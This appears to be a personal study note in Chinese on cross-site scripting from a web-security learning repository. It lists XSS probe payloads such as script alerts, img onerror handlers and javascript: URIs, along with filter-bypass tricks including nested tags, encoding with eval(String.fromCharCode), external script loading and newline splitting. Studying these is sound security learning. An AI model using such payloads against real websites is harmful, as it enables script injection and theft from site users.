## Cross-Site Scripting  
[同源策略](https://github.com/shinmao/Web-Security-Learning/blob/master/XSS/Same-Origin%20Policy.md)    
1. reflected xss (非持久型):    
  
2. stored xss (持久型):  
Forum或者留言板中, 在文本中加入script. (前端可能用ajax讀取內容  
  
3. DOM xss:   
注意: reflective型 以及 stored型 才會與server有互動，因為server需要解析惡意代碼，而DOM型則是完全由客戶端js執行。  

### XSS Vulnerability exists?
這裡先不談XSS探針...  
我習慣直接注入sciprt語句作測試，常見語句如下:  
```js
<script>alert(/1/);<script>
<script>a=prompt;a(1)</script>
<img src=1 onmouseover=alert(1)>
<img src=1 onerror=confirm(1)>
<img src="javascript:alert(1);">
<a href=1 onload=alert(1)>hi</a>
```
從上面我可以大致推斷攻擊代碼多為直接彈窗，或者觸發事件!  

### XSS and Cookie  

### 常見限制 < 對抗手勢
* filter 對一些危險標籤做過濾  
  * 大小寫混用  
  * 一次過濾繞過 e.g.```<scr<script>ipt>```  
  * 不如換個方式不使用到限制字符 e.g.```<img src=1 onerror=alert(1)>```
* encode 轉譯危險標籤  
  * url encode: % + ASCII(hex) ```%3Cscript%3E```  
  補充js常見處理函式: ```escape()/unescape(), encodeURL()/decodeURL(), encodeURLComponent()/decodeURLComponent()```  
  * html encode  
  * unicode encode: %u + ASCII(hex)  
  * ascii encode  
  ```js
  eval(String.fromCharCode(97,108,101,114,116,40,49,41))
  // <script>alert(1)</script>
  ```
  String.fromCharCode() 將unicode字碼轉換成字串 [Manual](https://www.w3schools.com/jsref/jsref_fromCharCode.asp)  
  eval() 執行參數中的js語句 [Manual](https://www.w3schools.com/jsref/jsref_eval.asp)  
* length limit  
  * 外部引入自己的script ```<script src=".js"></script>```  
* 未過濾\n類符號  
```js
<img src="javas
cript:
alert(/1/);">
```  
### Reference
1. The Web Application Hacker's Handbook
